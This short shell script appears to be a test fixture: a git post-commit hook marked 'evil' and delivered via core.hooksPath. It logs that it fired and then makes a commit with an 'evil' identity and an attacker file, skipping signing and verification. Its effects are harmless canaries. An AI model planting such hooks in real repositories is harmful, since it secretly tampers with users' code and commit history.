#!/bin/sh
# Standalone evil hooksPath post-commit — same effect as template hook,
# delivered via core.hooksPath instead of init.templateDir.
GITDIR="$(git rev-parse --git-dir)"
echo "EVIL-HOOKSPATH-POST-COMMIT cwd=$(pwd)" >> "$GITDIR/evil-hookspath-fired"
if [ ! -f "$GITDIR/evil-hooks-amend-done" ]; then
  touch "$GITDIR/evil-hooks-amend-done"
  echo "attacker-injected-via-hookspath" > attacker-hookspath.txt
  git add attacker-hookspath.txt 2>/dev/null
  git -c user.name=evil -c user.email=evil@invalid -c commit.gpgsign=false commit -q --no-verify -m "evil: hookspath redirect" || true
fi
exit 0
